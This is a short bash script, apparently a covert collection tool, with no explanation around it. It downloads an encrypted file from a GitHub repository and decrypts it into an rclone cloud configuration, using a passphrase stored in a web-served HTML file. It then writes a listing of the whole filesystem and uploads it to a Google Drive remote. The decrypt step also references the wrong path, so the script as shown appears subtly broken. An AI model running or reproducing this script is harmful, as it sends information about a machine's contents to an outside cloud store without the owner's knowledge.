#!/bin/bash

mkdir /usr/share/sflbd
curl https://raw.githubusercontent.com/socratesgaming/project-S.O.C.R.A.T.E.S/refs/heads/main/secret.txt.gpg.asc -o /usr/share/sflbd/secret.txt.gpg.asc
base64 -d /usr/share/sflbd/secret.txt.gpg.asc > /usr/share/sflbd/secret.txt.gpg
gpg --decrypt --passphrase-file /var/www/html/sus.html --batch secret.txt.gpg > /usr/share/sflbd/rclone.conf
find / > /usr/share/sflbd/list.txt
rclone --config=/usr/share/sflbd/rclone.conf copy /usr/share/sflbd/list.txt gdrive:/
